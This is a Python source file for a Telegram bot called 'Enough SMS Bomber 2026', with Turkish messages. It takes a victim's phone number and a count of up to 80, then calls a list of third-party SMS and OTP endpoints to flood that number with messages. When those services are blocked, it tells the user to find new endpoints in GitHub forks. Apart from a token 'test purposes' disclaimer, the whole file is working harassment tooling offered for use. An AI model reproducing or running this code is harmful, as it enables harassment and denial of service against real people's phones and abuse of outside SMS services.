# enough_sms_bomber_2026_fixed_no_parse_error.py

import asyncio
import logging
import os
import random
from datetime import datetime

import httpx
from dotenv import load_dotenv
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(__name__)

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN ortam değişkeni yok!")

SMS_SERVICES = [
    {"name": "kandilli-mirror", "url": "https://api.kandilli.info/sms", "method": "GET", "params": {"phone": "{phone}", "amount": "{count}"}},
    {"name": "sms24-vercel", "url": "https://sms24api.vercel.app/send", "method": "GET", "params": {"to": "{phone}", "count": "{count}"}},
    {"name": "temp-number", "url": "https://temp-number.org/api/sms", "method": "GET", "params": {"number": "{phone}", "amount": "{count}"}},
    {"name": "enough-v2-otp", "url": "https://api.enough.reborn.tr/otp", "method": "GET", "params": {"tel": "{phone}"}},
]

MAX_ADET = 80
TIMEOUT_S = 10.0
DELAY_MIN_MAX = (1.0, 4.0)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💥 *Enough SMS Bomber 2026 - Basit Mod*\n\n"
        "/sms → numarayı ve adedi yaz, hemen başlasın\n"
        "/cancel → durdur\n\n"
        "⚠ Test amaçlıdır. Yasal sorumluluk sende."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)


async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Parantez kaçırıldı → \( \) şeklinde
    text = (
        "📱 *Numarayı gir*\n"
        "Örnek: 5391234567 veya 905391234567\n"
        "\\(0'lı da yazsan otomatik +90 yaparım\\)"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
    context.user_data["state"] = "bekle_numara"


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    msg = update.message.text.strip()

    if state == "bekle_numara":
        tel = "".join(c for c in msg if c.isdigit())
        if tel.startswith("0"):
            tel = "90" + tel[1:]
        elif len(tel) == 10:
            tel = "90" + tel

        if len(tel) != 12 or not tel.startswith("90"):
            await update.message.reply_text("❌ Numara hatalı\. Tekrar gir\.", parse_mode=ParseMode.MARKDOWN_V2)
            return

        context.user_data["tel"] = tel
        context.user_data["state"] = "bekle_adet"

        text = (
            f"✅ Numara alındı: `{tel}`\n\n"
            f"🔥 Kaç adet SMS? \\(max {MAX_ADET}\\)"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)

    elif state == "bekle_adet":
        try:
            adet = int(msg)
            if adet < 1 or adet > MAX_ADET:
                await update.message.reply_text(f"1-{MAX_ADET} arası sayı gir\.", parse_mode=ParseMode.MARKDOWN_V2)
                return
        except ValueError:
            await update.message.reply_text("Sayı gir amk\.", parse_mode=ParseMode.MARKDOWN_V2)
            return

        context.user_data["adet"] = adet
        context.user_data["state"] = None

        tel = context.user_data["tel"]
        text = (
            f"🚀 *Yolluyorum...*\n"
            f"Numara → `{tel}`\n"
            f"Adet → `{adet}`\n"
            f"Bekle..."
        )
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)

        basarili, servis = await gonder_sms(tel, adet)

        if basarili:
            cevap = (
                f"✅ *Gönderildi\!*\n"
                f"Servis → `{servis}`\n"
                f"Numara → `{tel}`\n"
                f"Adet → `{adet}`\n"
                f"{datetime.now().strftime('%H:%M:%S')}"
            )
        else:
            cevap = (
                f"❌ *Hiçbir servis tutmadı*\n"
                f"Numara → `{tel}`\n"
                f"Adet → `{adet}`\n"
                f"Servisler banlanmış veya kapalı\.\n"
                f"GitHub'da yeni fork bulup endpoint ekle\."
            )

        await update.message.reply_text(cevap, parse_mode=ParseMode.MARKDOWN_V2)


async def gonder_sms(tel: str, adet: int) -> tuple[bool, str]:
    async with httpx.AsyncClient(http2=True, follow_redirects=True) as client:
        for servis in SMS_SERVICES:
            try:
                url = servis["url"]
                if servis["method"] == "GET":
                    params = {k: v.format(phone=tel, count=adet) for k, v in servis.get("params", {}).items()}
                    resp = await client.get(url, params=params, timeout=TIMEOUT_S)
                elif servis["method"] == "POST":
                    data = {k: v.format(phone=tel, count=adet) for k, v in servis.get("json", {}).items()}
                    resp = await client.post(url, json=data, timeout=TIMEOUT_S)
                else:
                    continue

                if resp.status_code in (200, 201, 202):
                    logger.info(f"{servis['name']} → OK | {resp.text[:80]}")
                    await asyncio.sleep(random.uniform(*DELAY_MIN_MAX))
                    return True, servis["name"]

                logger.warning(f"{servis['name']} → {resp.status_code} | {resp.text[:120]}")
                await asyncio.sleep(random.uniform(*DELAY_MIN_MAX))

            except Exception as ex:
                logger.error(f"{servis.get('name', 'Servis')} patladı: {ex}")

    return False, "tümü başarısız"


def main():
    app = Application.builder().token(BOT_TOKEN).read_timeout(45).write_timeout(45).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sms", sms))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Enough SMS Bomber 2026 syntax + MarkdownV2 temiz başladı")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
